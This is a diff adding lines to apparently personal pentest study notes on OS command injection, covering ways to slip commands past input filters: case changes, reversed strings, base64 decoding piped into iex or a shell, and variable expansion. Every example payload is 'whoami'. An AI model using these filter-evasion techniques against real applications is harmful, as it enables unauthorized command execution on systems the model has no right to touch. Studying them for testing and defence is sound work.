@@ -64,3 +64,17 @@ ping -c 1 [user_input]
 	- `'`
 	- `"`
 	- `^` : *Windows*
+- Case Manipulation in *Windows* sometimes works as it is not case-sensitive. Linux is case-sensitive so it will fail.
+	- Some creative ways we can do this on linux is to use `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`, which will convert it to lowercase but the command may slip pass filtering
+	- We can also use `$(a="WhOaMi";printf %s "${a,,}")` for the same effect
+- Reverse strings
+	- `$(rev<<<'imaohw')` : Linux
+	- `iex "$('imaohw'[-1..-20] -join '')"` : Windows
+- Base64 Encoding
+	- `$(base64 -d<<<[b64_encoded_string])` : *Linux*
+	- To do this on *Windows* we can convert the text to B64 (*UTF-16 though*): 
+		- `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`
+		- `echo -n 'whoami' | iconv -f utf-8 utf-16le | base64`
+	- Then we can decode it with `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('b64_string')))"`
+- Variable expansion with [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion)
+> In all these, we can swap `<<<` with `|` interchangeably depending on what is denied.
